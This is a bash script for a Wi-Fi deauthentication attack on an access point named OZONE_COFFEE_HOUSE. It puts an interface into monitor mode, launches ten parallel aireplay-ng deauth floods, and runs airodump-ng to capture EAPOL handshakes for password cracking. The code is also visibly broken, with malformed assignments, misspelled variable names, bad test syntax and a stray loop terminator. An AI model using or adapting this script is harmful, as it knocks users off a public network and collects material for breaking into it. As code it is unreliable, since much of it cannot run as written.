#!/bin/bash
if [[ $EUID -ne 0 ]]; then
    echo "You must be root to do this." 1>&2
    exit 100
fi

#Get Bssid of the access point 
BSSID_AP=cat channel.txt -r 1:150  | grep OZONE_COFFEE_HOUSE | cut -d " " -f2 

#Get channel  from deauthentification packets 
AFTER=aireplay-ng -0 0 -a $BSSID_AP_CHANNEL   wlan0mon > file.txt  ; cat file.txt -r 1 | cut -d " " -f11

#Get the channel where its being waved from 
PRE=cat channel.txt -r 1:150  | grep OZONE_COFFEE_HOUSE | cut -d " " -f27 

#Changing the interface to monitor 
change_iface_monitor(){ 
	echo "Changing $iface to monitor mode..."
	ifconfig $IFACE_NAME down 
	iwconfig $IFCA_NAME mode monitor
	ifconfig $IFACE_NAME up  
	#check if the interface in monitor mode 
	if [[ $IFACE_NAME != *mon*i ]] ; then
		echo "error occured , cant change to monitor mode"
		exit 
	fi 
}

#Get interface in managed mode 
IFACE_NAME=$(netstat -i | tail -1 | cut -d" " -f1)
get_interface(){ 
	if [["$IFACE_NAME" == *"mon"* ]] ; then 
		return $IFACE_NAME 
	else 
		echo "Interface not in managed mode" ; 
		echo "changing to monitor mode"
		change_iface_monitor()
	fi 
}

multi_threading_death()  {
	if [$AFTER != $PRE_CHANNEL ] 
	then 
		exit
	else
		for i in {1..10} 
		do 
			aireplay-ng -0 0 -a $BSSID_AP     $IFACE_NAME & 
		done 
	fi 
}

#Check if the multithreading working 
#get threads 
TREADS=$(airodump-ng -c $AFTER --bssid $BSSID_AP -w psk wlan0) 

check_threads() { 

	for i in {1..200} ; do 
		cat -r 8  dump.txt | cut -d " " -f$i ;  done | grep "EAPOL" 
	done 

}

